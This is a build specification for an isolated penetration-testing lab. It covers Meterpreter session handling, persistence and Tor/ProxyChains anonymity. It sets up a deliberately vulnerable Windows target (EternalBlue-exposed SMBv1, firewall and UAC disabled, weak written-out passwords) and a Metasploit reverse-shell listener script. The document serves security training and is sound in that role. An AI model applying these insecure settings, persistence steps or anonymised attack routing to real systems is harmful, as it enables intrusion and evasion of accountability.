# Lab 2: Meterpreter and Anonymity - Build Specification Sheet

## Document Purpose

This specification sheet is to be provided to a lab developer or training environment engineer for construction of a complete, self-contained penetration testing lab environment.

---

## 1. LAB OVERVIEW & METADATA

| Field                                 | Value                                    |
| ------------------------------------- | ---------------------------------------- |
| **Lab ID**                            | LAB-02-METERPRETER-ANON                  |
| **Lab Name**                          | Meterpreter and Anonymity Suite          |
| **Version**                           | 1.0                                      |
| **Estimated Student Completion Time** | 3-4 hours                                |
| **Difficulty Level**                  | Intermediate                             |
| **Prerequisite Lab**                  | LAB-01 (Basic Metasploit & Exploitation) |

### 1.1 Core Learning Outcomes

Upon completion, the student must be able to:

1. Establish and manage multiple Meterpreter sessions with process migration
2. Deploy persistence mechanisms that survive system reboot
3. Configure Tor + ProxyChains for anonymous routing
4. Detect and analyze DNS leaks using Wireshark
5. Identify anomalous DNS patterns indicative of C2 activity

---

## 2. VIRTUAL MACHINE REQUIREMENTS

### 2.1 Attacker Machine (Kali Linux)

| Specification           | Requirement                                                                   |
| ----------------------- | ----------------------------------------------------------------------------- |
| **OS**                  | Kali Linux 2025.4 or newer                                                    |
| **RAM**                 | Minimum 4 GB (8 GB recommended)                                               |
| **Disk Space**          | 40 GB                                                                         |
| **CPU Cores**           | 2                                                                             |
| **Network Adapter 1**   | NAT or Bridged (for internet access)                                          |
| **Network Adapter 2**   | Host-Only (192.168.56.0/24) for target communication                          |
| **Pre-installed Tools** | Metasploit Framework, Tor, ProxyChains4, Wireshark, Nmap, curl, dig, nslookup |
| **Default Credentials** | kali:kali                                                                     |

### 2.2 Target Machine (Windows)

| Specification           | Requirement                                          |
| ----------------------- | ---------------------------------------------------- |
| **OS**                  | Windows 10 Pro (21H2 or newer) or Windows 11         |
| **RAM**                 | 4 GB                                                 |
| **Disk Space**          | 40 GB                                                |
| **CPU Cores**           | 2                                                    |
| **Network Adapter**     | Host-Only (192.168.56.0/24)                          |
| **Firewall**            | Windows Defender Firewall: Disabled for lab purposes |
| **UAC**                 | Set to "Never Notify"                                |
| **Default Credentials** | labuser:Password123!                                 |
| **Admin Account**       | Administrator:AdminPass123!                          |

### 2.3 Network Topology

```
┌─────────────────┐      Host-Only Network      ┌─────────────────┐
│   Kali Linux    │◄────────────────────────────►│    Windows 10   │
│   (Attacker)    │      192.168.56.0/24         │    (Target)     │
│  192.168.56.100 │                               │  192.168.56.150 │
└────────┬────────┘                               └─────────────────┘
         │
         │ NAT / Bridged
         ▼
    [Internet]
         │
         ▼
    [Tor Network]
```

---

## 3. SOFTWARE & TOOL CONFIGURATION SPECIFICATIONS

### 3.1 Kali Linux - Required Package State

| Package              | Version Minimum | Configuration Notes                    |
| -------------------- | --------------- | -------------------------------------- |
| metasploit-framework | 6.4.x           | Postgresql service enabled             |
| tor                  | 0.4.8.x         | SOCKS5 on 127.0.0.1:9050               |
| proxychains4         | 4.16            | Config file pre-modified (see 3.2)     |
| wireshark            | 4.0.x           | Non-root user added to wireshark group |
| firefox-esr          | 115.x           | No pre-configured proxy                |

### 3.2 ProxyChains Configuration File (Pre-Built)

**Location:** `/etc/proxychains4.conf`

The following lines must be **uncommented** or set exactly as shown:

```ini
# Chain type - dynamic recommended
dynamic_chain

# DNS proxy - CRITICAL for preventing leaks
proxy_dns

# TCP read timeout
tcp_read_time_out 15000

# TCP connect timeout
tcp_connect_time_out 8000

# SOCKS proxy configuration
[ProxyList]
socks5 127.0.0.1 9050
```

**Additional requirement:** Add a second commented proxy line for student reference:

```ini
# socks4 127.0.0.1 1080   # Example additional proxy
```

### 3.3 Tor Service Configuration

**Location:** `/etc/tor/torrc`

Verify or set these lines:

```ini
SOCKSPort 9050
SOCKSPolicy accept 127.0.0.1
Log notice file /var/log/tor/notices.log
```

**Service must be:** Enabled to start on boot (`systemctl enable tor`)

---

## 4. WINDOWS TARGET CONFIGURATION

### 4.1 Pre-Installed Vulnerabilities (For Initial Access)

The Windows target must have **at least one** of the following vulnerabilities to allow initial Meterpreter access:

| Option | Vulnerability                             | Port | Payload                               |
| ------ | ----------------------------------------- | ---- | ------------------------------------- |
| A      | SMBv1 enabled with EternalBlue (MS17-010) | 445  | `windows/x64/meterpreter/reverse_tcp` |
| B      | Apache 2.4.23 with vulnerable PHP         | 80   | `php/meterpreter/reverse_tcp`         |
| C      | WinRM with weak credentials               | 5985 | `windows/x64/meterpreter/reverse_tcp` |

**Recommendation:** Option A (EternalBlue) for reliability.

### 4.2 Process List Requirements

The Windows VM must contain these specific processes for migration exercises:

| Process Name          | PID (approximate) | Privilege Level | Architecture |
| --------------------- | ----------------- | --------------- | ------------ |
| explorer.exe          | Dynamic           | User            | x64          |
| svchost.exe           | Dynamic           | SYSTEM          | x64          |
| winlogon.exe          | Dynamic           | SYSTEM          | x64          |
| notepad.exe (running) | Dynamic           | User            | x64          |

**Instruction for lab builder:** Ensure at least one instance of notepad.exe is open at snapshot time.

### 4.3 Registry and File System State (For Persistence Testing)

The target must have **no existing persistence mechanisms** at baseline. The following locations should be empty of lab-related artifacts:

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `C:\Users\*\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\`
- `C:\Windows\System32\Tasks\` (no suspicious scheduled tasks)

### 4.4 User Account Configuration

| Account       | Type          | Password      | Purpose                     |
| ------------- | ------------- | ------------- | --------------------------- |
| labuser       | Standard User | Password123!  | Initial compromise vector   |
| Administrator | Admin         | AdminPass123! | Privilege escalation target |
| Guest         | Disabled      | N/A           | Not used                    |

**UAC Setting:** `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA` = 0

---

## 5. METASPLOIT CONFIGURATION

### 5.1 Required Database State

```bash
# These commands must be run before snapshot
systemctl enable postgresql
systemctl start postgresql
msfdb init
```

### 5.2 Required Payloads (Pre-downloaded)

Ensure these payloads are available in Metasploit:

| Payload Path                               |
| ------------------------------------------ |
| `windows/x64/meterpreter/reverse_tcp`      |
| `windows/meterpreter/reverse_tcp`          |
| `exploit/windows/local/persistence`        |
| `exploit/multi/handler`                    |
| `exploit/windows/smb/ms17_010_eternalblue` |

### 5.3 Listener Configuration (Template for Student Use)

Create a resource script at `/home/kali/lab2_listener.rc`:

```ruby
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.100
set LPORT 4444
set ExitOnSession false
exploit -j -z
```

---

## 6. EXERCISE CHECKLIST & VALIDATION

The lab builder must verify each of these works BEFORE delivering the environment:

### Part 1: Meterpreter Session Management

| Check                              | Validation Command/Test           | Pass/Fail |
| ---------------------------------- | --------------------------------- | --------- |
| Initial access possible            | Exploit target, get session       | ☐         |
| `sysinfo` returns data             | Run command, verify output        | ☐         |
| `getuid` shows user context        | Run command, verify               | ☐         |
| Process list accessible            | `ps` returns >20 processes        | ☐         |
| Migration to explorer.exe possible | `migrate <explorer PID>` succeeds | ☐         |
| Session survives migration         | `getpid` shows new PID            | ☐         |

### Part 2: Maintaining Access

| Check                              | Validation Command/Test                 | Pass/Fail |
| ---------------------------------- | --------------------------------------- | --------- |
| Persistence module loads           | `use exploit/windows/local/persistence` | ☐         |
| Persistence executes without error | Run module with SYSTEM startup          | ☐         |
| Multi-handler accepts callback     | Listener on LPORT 4445 receives session | ☐         |
| Persistence survives reboot        | Reboot target, session reconnects       | ☐         |

### Part 3: Proxy Anonymity

| Check                                | Validation Command/Test                             | Pass/Fail |
| ------------------------------------ | --------------------------------------------------- | --------- |
| Tor service running                  | `systemctl status tor` shows active                 | ☐         |
| SOCKS5 proxy responsive              | `curl --socks5 127.0.0.1:9050 ifconfig.me`          | ☐         |
| ProxyChains configured correctly     | `grep "dynamic_chain" /etc/proxychains4.conf`       | ☐         |
| proxy_dns enabled                    | `grep "proxy_dns" /etc/proxychains4.conf`           | ☐         |
| Firefox launches through proxychains | `proxychains4 firefox` reaches check.torproject.org | ☐         |

### Part 4: DNS Leak Analysis

| Check                                  | Validation Command/Test                                    | Pass/Fail |
| -------------------------------------- | ---------------------------------------------------------- | --------- |
| Wireshark captures DNS traffic         | Filter `udp.port == 53` shows queries                      | ☐         |
| No DNS leaks with proxy_dns            | `proxychains4 nslookup google.com` shows no UDP 53 traffic | ☐         |
| DNS leaks detectable without proxy_dns | Disable proxy_dns, run test, capture shows leaks           | ☐         |

---

## 7. DELIVERABLE ARTIFACTS FOR LAB BUILDER

Provide the following with the completed lab environment:

### 7.1 Virtual Machine Images

| File               | Format  | Compression |
| ------------------ | ------- | ----------- |
| kali-lab2.ova      | OVA 2.0 | ZIP         |
| windows10-lab2.ova | OVA 2.0 | ZIP         |

### 7.2 Documentation

- `README.md` - Network configuration and IP addresses
- `snapshot_instructions.txt` - State of each VM at snapshot
- `troubleshooting.md` - Common issues and fixes

### 7.3 Validation Script (Optional)

Provide `/home/kali/validate_lab2.sh` that runs all validation checks and outputs PASS/FAIL:

```bash
#!/bin/bash
# Lab 2 Validation Script - Run on Kali VM

echo "=== LAB 2 VALIDATION ==="

# Check Tor
if systemctl is-active --quiet tor; then
    echo "[PASS] Tor is running"
else
    echo "[FAIL] Tor is not running"
fi

# Check ProxyChains config
if grep -q "^dynamic_chain" /etc/proxychains4.conf && grep -q "^proxy_dns" /etc/proxychains4.conf; then
    echo "[PASS] ProxyChains configured correctly"
else
    echo "[FAIL] ProxyChains configuration incomplete"
fi

# Check Metasploit
if msfconsole -q -x "db_status; exit" | grep -q "postgresql selected"; then
    echo "[PASS] Metasploit database connected"
else
    echo "[FAIL] Metasploit database not ready"
fi

# Check target reachability
if ping -c 1 192.168.56.150 &>/dev/null; then
    echo "[PASS] Target VM reachable at 192.168.56.150"
else
    echo "[FAIL] Target VM not reachable"
fi
```

---

## 8. BUILD TIMELINE & ACCEPTANCE CRITERIA

### 8.1 Estimated Build Time

| Task                         | Estimated Hours |
| ---------------------------- | --------------- |
| Kali VM configuration        | 1               |
| Windows VM configuration     | 2               |
| Network setup and testing    | 0.5             |
| Validation and documentation | 0.5             |
| **Total**                    | **4 hours**     |

### 8.2 Acceptance Criteria

The lab is considered **complete and acceptable** when:

1. All validation checks in Section 6 pass
2. A student following the lab specification can complete all tasks within 4 hours
3. No external internet access is required for core exercises (Tor requires internet - document this)
4. Snapshot exists for each VM at the "ready to start" state
5. All credentials documented and functional

### 8.3 Exclusion List (Not Required)

The lab builder does NOT need to provide:

- Answer key or solution guide (this will be separate)
- Student lab manual (provided separately)
- Automated grading system
- Cloud deployment configuration

---

## 9. DELIVERY CHECKLIST FOR AGENT

- [ ] Kali Linux OVA exported and compressed
- [ ] Windows 10 OVA exported and compressed
- [ ] Network configured (Kali: 192.168.56.100, Windows: 192.168.56.150)
- [ ] Tor service enabled and starting on boot
- [ ] ProxyChains configuration file edited as specified
- [ ] Metasploit database initialized
- [ ] Windows target has initial access vulnerability (EternalBlue recommended)
- [ ] Windows target has no pre-existing persistence
- [ ] All validation checks passed
- [ ] README documentation included
- [ ] Snapshot taken on both VMs at clean state
- [ ] Files delivered via secure transfer (encrypted ZIP or internal server)

---

**END OF SPECIFICATION SHEET**
